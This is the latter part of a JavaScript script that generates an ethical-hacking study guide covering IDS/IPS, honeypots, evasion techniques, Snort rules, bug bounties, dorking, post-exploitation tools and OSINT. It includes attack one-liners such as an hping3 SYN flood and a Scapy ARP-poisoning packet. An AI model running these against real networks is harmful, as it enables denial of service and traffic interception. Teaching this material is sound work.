          ["NGFW", "L3–L7", "Combines stateful + IPS + DPI + SSL inspection + app control.", "Expensive; complex configuration"],
          ["WAF", "L7 (HTTP)", "Inspects HTTP/HTTPS specifically; blocks SQLi, XSS, CSRF.", "Only for web traffic; needs tuning to reduce false positives"],
        ],
        [2000, 1200, 3600, 2560]
      ),
      ...sp(1),

      h2("4.2  IDS vs. IPS — Detailed Comparison"),
      makeTable(
        ["Feature", "IDS (Intrusion Detection System)", "IPS (Intrusion Prevention System)"],
        [
          ["Core Function", "Detect and alert — passive monitoring", "Detect and block — active enforcement"],
          ["Deployment", "Out-of-band — traffic mirrored via SPAN/TAP port", "Inline — all traffic flows directly through"],
          ["Response to Threat", "Generates an alert only; no packet blocking", "Drops malicious packets in real time"],
          ["Latency Impact", "Zero — traffic copy, not original", "Slight latency — inline processing"],
          ["False Positive Risk", "Lower — only generates alerts", "Higher — can block legitimate traffic"],
          ["Failure Mode", "Safe — if IDS fails, traffic still flows", "Risky — if IPS fails, traffic may be blocked"],
          ["Detection Methods", "Signature-based, Anomaly-based, Heuristic", "Same detection + active response capability"],
          ["Examples", "Snort (passive mode), OSSEC, Zeek", "Snort (inline), Suricata, Cisco IPS, Palo Alto"],
        ],
        [2400, 3480, 3480]
      ),
      ...sp(1),
      note("NIDS (Network IDS) monitors entire network segments. HIDS (Host IDS) monitors a specific host's files, logs, and processes. Both can be signature-based (known attacks) or anomaly-based (deviation from baseline — detects zero-days but higher false positives)."),
      ...sp(1),

      h2("4.3  Honeypots"),
      body("A honeypot is a decoy system intentionally deployed to attract attackers, study their techniques, collect IOCs, and detect unauthorized access attempts."),
      makeTable(
        ["Type", "Description", "Example Tool"],
        [
          ["Low-Interaction", "Emulates services superficially — limited attacker engagement but very safe", "Honeyd"],
          ["High-Interaction", "Real OS and real services — rich intelligence but higher risk if compromised", "Honeynet"],
          ["Research Honeypot", "Deployed to study new attack techniques and zero-days", "University/security lab honeynets"],
          ["Production Honeypot", "Deployed in real networks to detect and alert on attacks", "Cowrie, Glastopf, Kippo"],
        ],
        [2200, 4500, 2660]
      ),
      ...sp(1),
      h3("How Attackers Detect Honeypots"),
      bullet("Response timing analysis — emulated services respond too quickly or have unusual timing"),
      bullet("VMware/VirtualBox artifacts — specific MAC address prefixes, registry keys, hardware IDs"),
      bullet("Unusually short system uptime — real servers are rarely newly rebooted"),
      bullet("OS fingerprinting inconsistencies — banner says Windows XP but fingerprint shows Linux"),
      bullet("Limited resource availability — no browsing history, no real user files"),
      ...sp(1),

      h2("4.4  IDS / Firewall Evasion Techniques"),
      makeTable(
        ["Technique", "Target", "How It Works"],
        [
          ["Fragmentation", "IDS / Firewall", "Split malicious packets — no single fragment contains complete attack signature"],
          ["TTL Manipulation", "IDS", "Send decoy packets with low TTL — confuses IDS state tracking"],
          ["Encryption (SSL/TLS)", "IDS / IPS", "Hides payload inside encrypted traffic that IDS cannot inspect without SSL decryption"],
          ["Obfuscation / Encoding", "IDS", "URL-encode attack strings: %3Cscript%3E instead of <script>"],
          ["Protocol Tunneling", "Firewall", "Hide malicious traffic inside allowed protocols (DNS, ICMP, HTTP)"],
          ["Low and Slow", "IDS", "Send attack traffic very slowly to blend with normal traffic and avoid rate-based rules"],
          ["Insertion Attack", "IDS", "Send invalid packets that IDS accepts but target host rejects — causes IDS/host state mismatch"],
          ["Session Splicing", "IDS", "Split attack payload across many tiny TCP segments"],
          ["IP Fragmentation", "Firewall", "Each fragment appears harmless — firewall passes them all; host reassembles attack"],
          ["ICMP Tunneling", "Firewall", "Encode C2 data inside ICMP ping packets (usually allowed through firewalls)"],
          ["ACK Tunneling", "Firewall", "Pass data in ACK packets — stateless firewalls may not inspect ACK flags"],
          ["Polymorphic Shellcode", "IDS / AV", "Change shellcode structure each iteration — evades signature matching"],
        ],
        [2200, 1600, 5560]
      ),
      ...sp(1),

      h2("4.5  Key Tools — Unit 4"),
      h3("Snort (NIDS/NIPS)"),
      body("World's most widely deployed open-source network IDS/IPS (maintained by Cisco). Operates in three modes: Sniffer, Packet Logger, and Network IDS."),
      codeBlock([
        "# Snort rule syntax: action proto src/port -> dst/port (options)",
        "alert tcp any any -> 192.168.1.0/24 80 (msg:\"HTTP traffic detected\"; sid:1001;)",
        "alert tcp any any -> any 445 (msg:\"SMB traffic - potential EternalBlue\"; sid:1002;)",
      ]),
      ...sp(1),
      h3("Suricata"),
      bullet("Multi-threaded engine — handles 10+ Gbps networks (unlike Snort's single-thread design)"),
      bullet("Compatible with Snort rules; adds native JSON (EVE) logging for SIEM integration"),
      bullet("Deep protocol parsing: HTTP, DNS, TLS, FTP, SMB, SSH with file extraction capability"),
      ...sp(1),
      h3("Hping3 — Packet Assembler"),
      makeTable(
        ["Command", "Purpose"],
        [
          ["hping3 -S -p 80 target", "Send SYN packet to port 80"],
          ["hping3 -A -p 80 target", "ACK scan — tests stateless firewalls"],
          ["hping3 --udp -p 53 target", "UDP test to port 53 (DNS)"],
          ["hping3 -S --flood -p 80 target", "SYN flood DoS test — stress testing"],
          ["hping3 -1 target", "ICMP ping (like regular ping)"],
          ["hping3 -T target", "Traceroute mode"],
        ],
        [3800, 5560]
      ),
      ...sp(1),
      h3("Scapy — Python Packet Manipulation"),
      codeBlock([
        "from scapy.all import *",
        "send(IP(dst='192.168.1.1')/ICMP())                          # Ping",
        "sr(IP(dst='target')/TCP(dport=80, flags='S'))               # SYN scan",
        "sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,pdst='victim',hwdst='attacker_mac'))  # ARP poison",
      ]),
      ...sp(1),
      h3("Cowrie — SSH/Telnet Honeypot"),
      bullet("Medium-to-high interaction SSH and Telnet honeypot — emulates a full Unix shell"),
      bullet("Logs all attacker commands, brute-force attempts, uploaded/downloaded files"),
      bullet("Outputs JSON logs for SIEM integration; provides fake filesystem for attacker exploration"),
      bullet("Information gathered: attacker IPs, password lists used, commands executed, malware dropped"),
      ...sp(1),

      pageBreak(),

// ══════════════════════════════════════════════════════════════════════════════
// UNIT 5
// ══════════════════════════════════════════════════════════════════════════════
      unitBanner("UNIT 5 — Bug Bounty, Post-Exploitation & Advanced Topics"),
      ...sp(1),

      h2("5.1  Bug Bounty Programs"),
      body("Bug bounty programs are formal initiatives where organizations invite security researchers to discover and responsibly report vulnerabilities in exchange for financial rewards or recognition."),
      ...sp(1),
      makeTable(
        ["Platform", "Notable Clients", "Key Feature"],
        [
          ["HackerOne", "Twitter, GitHub, Uber, Spotify", "Largest platform; mediation service; Hall of Fame"],
          ["Bugcrowd", "Tesla, Mastercard, Atlassian", "Managed programs; triage service included"],
          ["Synack", "US Department of Defense, enterprises", "Vetted researchers; private programs"],
          ["Intigriti", "European companies, EU institutions", "GDPR-compliant; European-focused"],
        ],
        [1700, 3500, 4160]
      ),
      ...sp(1),
      h3("Responsible Disclosure Process"),
      bullet("Step 1: Discover a vulnerability within the defined program scope"),
      bullet("Step 2: Report it privately to the organization through the designated channel with PoC"),
      bullet("Step 3: Give the organization reasonable time to patch — 90 days (Google Project Zero standard)"),
      bullet("Step 4: If unfixed after deadline, consider coordinated public disclosure to create remediation pressure"),
      bullet("Step 5: Only publicly disclose after the patch is released and users have had time to update"),
      ...sp(1),
      makeTable(
        ["Severity", "Reward Range", "Example"],
        [
          ["Critical (9–10 CVSS)", "$10,000 – $100,000+", "RCE in Chrome, iCloud auth bypass"],
          ["High (7–8.9)", "$1,000 – $10,000", "Account takeover via IDOR, auth flaw"],
          ["Medium (4–6.9)", "$100 – $1,000", "Stored XSS, CSRF on sensitive action"],
          ["Low / Info", "Swag / Hall of Fame", "Self-XSS, non-sensitive info disclosure"],
        ],
        [2200, 2500, 4660]
      ),
      ...sp(1),

      h2("5.2  Google Dorking"),
      body("Google Dorking uses advanced search operators to find unintentionally exposed sensitive information indexed by search engines."),
      makeTable(
        ["Operator", "Purpose", "Practical Example"],
        [
          ["site:", "Limit results to a specific domain", "site:target.com → all indexed pages"],
          ["filetype: / ext:", "Find specific file types", "filetype:pdf site:target.com | ext:sql site:target.com"],
          ["intitle:", "Search in page titles", "intitle:\"index of\" → open directory listings"],
          ["inurl:", "Search in URL path", "inurl:admin site:target.com | inurl:login"],
          ["intext:", "Search in body text of pages", "intext:\"sql syntax error\" site:target.com"],
          ["cache:", "Show Google cached version of a page", "cache:target.com"],
          ["link:", "Find pages that link to a specific URL", "link:target.com"],
          ["related:", "Find sites similar to a specific URL", "related:target.com"],
        ],
        [2200, 3600, 3560]
      ),
      ...sp(1),

      h2("5.3  Post-Exploitation & Privilege Escalation"),
      body("Post-exploitation covers the actions taken by an attacker after gaining access to a target system. It focuses on understanding the system value, elevating privileges to Administrator/root, identifying sensitive data, and moving laterally to other high-value systems on the network."),
      ...sp(1),
      makeTable(
        ["Tool / Method", "Type", "Key Actions / Capabilities"],
        [
          ["Mimikatz", "Credential Dumping", "Extracts cleartext passwords, PINs, and Kerberos tickets from memory (LSASS process); executes Pass-the-Hash / Pass-the-Ticket attacks; creates Golden/Silver Tickets for persistent AD dominance."],
          ["LinPEAS / WinPEAS", "Privilege Escalation", "Automated scripts that scan Linux/Windows hosts for misconfigured services, weak file permissions, unpatched kernel exploits, exposed passwords, and path hijacking opportunities."],
          ["Meterpreter", "Post-Exploitation Shell", "In-memory shell providing rich post-exploitation features: 'getsystem' for instant SYSTEM privilege escalation, 'hashdump' to dump SAM registry hashes, keylogging, and port forwarding."],
          ["BloodHound", "Active Directory Analysis", "Uses graph theory to map relationship paths in Active Directory environments. Highlights direct paths to Domain Admin by analyzing ACLs, group memberships, and active sessions."],
          ["PowerShell Empire", "C2 Framework", "Post-exploitation and command-and-control framework that utilizes PowerShell and Python agents. Provides stealthy communications and extensive modular post-exploitation scripts."],
        ],
        [2200, 2200, 4960]
      ),
      ...sp(1),
      h3("Common Post-Exploitation Techniques"),
      bulletBold("Privilege Escalation:", "Moving from a low-privilege user account to root/SYSTEM by exploiting unpatched OS kernels, weak service permissions (e.g., Unquoted Service Paths), or misconfigured cron jobs/scheduled tasks."),
      bulletBold("Pivoting / Lateral Movement:", "Using a compromised host as a jump-box/proxy to route traffic and attack other internal systems that are not directly exposed to the internet."),
      bulletBold("Persistence:", "Ensuring access is maintained even after system reboots. Implemented using registry autorun keys, scheduled tasks, cron jobs, user account creation, or custom backdoors."),
      bulletBold("Data Exfiltration:", "Extracting stolen sensitive information using stealthy channels like DNS tunneling, ICMP tunneling, or encrypted HTTPS POST requests to avoid detection by DLP systems."),
      ...sp(1),

      h2("5.4  Advanced OSINT & Reconnaissance"),
      body("Open Source Intelligence (OSINT) is the collection, analysis, and synthesis of data gathered from publicly available, open sources. It is crucial in the reconnaissance phase to map the target's external footprint and construct phishing pretexts."),
      ...sp(1),
      makeTable(
        ["Tool", "Data Gathered", "Primary Use Case"],
        [
          ["Shodan", "Banners, open ports, OS versions, device types, geolocations of IoT and servers", "Finding internet-facing assets with default credentials or unpatched vulnerabilities."],
          ["Maltego", "Graphical link analysis mapping domains, DNS records, IPs, emails, companies, and people", "Visualizing complex relationships and footprints during large-scale external recon."],
          ["Censys", "Comprehensive global certificate and host scan data, domain ownership records", "Identifying shadow IT assets, expired certificates, and misconfigured public clouds."],
          ["SpiderFoot", "Automated OSINT scans across 100+ public sources (WHOIS, DNS, shodan, social media, pastbins)", "Automating threat intelligence gathering and asset discovery for passive monitoring."],
          ["theHarvester", "Emails, subdomains, nameservers, open ports, and employee names from search engines", "Gathering initial target details from Google, Bing, PGPs, and LinkedIn for social engineering prep."],
        ],
        [1800, 3800, 3760]
      ),
      ...sp(1),
      note("While OSINT is passive and legal, compiling a highly detailed profile of employee names, roles, and corporate technologies is the most common precursor to a successful spear-phishing campaign."),
      ...sp(1),

      h2("5.5  Exam Preparation & Study Strategies"),
      body("To successfully master the Ethical Hacking & Penetration Testing curriculum and excel in certification exams (such as CEH, OSCP, or CompTIA PenTest+), candidates should combine theoretical knowledge with practical labs."),
      ...sp(1),
      bulletBold("Hands-on Labs:", "Build a personal home lab using VirtualBox/VMware, Kali Linux, and vulnerable VMs from VulnHub or Hack The Box."),
      bulletBold("Understand the Why:", "Do not just memorize tool commands. Learn the underlying network protocols (TCP/IP, UDP, ICMP) and service architectures."),
      bulletBold("Methodological Approach:", "Always follow a structured penetration testing framework (such as PTES or NIST SP 800-115) to ensure completeness of the assessment."),
      bulletBold("Keep Up to Date:", "Cybersecurity is a rapidly evolving field. Regularly read threat intelligence reports, CVE databases, and security blogs to stay aware of new exploits and defense mechanisms."),
      ...sp(2),
    ]
  }]
});

Packer.toBuffer(doc).then((buffer) => {
  fs.writeFileSync("Ethical_Hacking_Study_Guide.docx", buffer);
  console.log("Document created successfully.");
});
